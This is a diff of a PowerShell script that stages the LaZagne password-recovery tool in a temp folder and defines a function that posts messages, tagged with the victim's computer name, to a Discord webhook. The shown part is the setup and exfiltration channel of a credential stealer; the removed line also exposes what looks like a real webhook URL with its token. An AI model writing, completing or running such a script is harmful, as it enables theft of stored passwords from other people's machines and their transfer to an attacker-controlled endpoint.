@@ -1,5 +1,5 @@
 # Define variables
-$webhook = "https://discord.com/api/webhooks/1237789574537810121/W_2CZivcnqxnt2gJuBj1eTf9w_8J7Wqvqs2pdjafWCXF4Yfu7w-DWjhRCW1Aaq0LQ7tn"
+$webhook = "YourDiscordWebhookURL"
 $version = "2.4.6"
 $tempDir = "$env:TEMP\LaZagne"
 $logFile = "$tempDir\output.txt"
@@ -8,14 +8,18 @@ $laZagnePath = "$tempDir\LaZagne.exe"
 
 # Function to send a message to Discord for logging
 function Send-DiscordMessage($message) {
-    $payload = @{
-        username = "$env:COMPUTERNAME"
-        content = $message
-    }
-    try {
-        Invoke-RestMethod -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json)
-    } catch {
-        Write-Host "Failed to send message to Discord: $_"
+    if ($message -and $message.Trim() -ne "") {
+        $payload = @{
+            username = "$env:COMPUTERNAME"
+            content = $message
+        }
+        try {
+            Invoke-RestMethod -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json)
+        } catch {
+            Write-Host "Failed to send message to Discord: $_"
+        }
+    } else {
+        Write-Host "Skipped sending empty message to Discord."
     }
 }
 
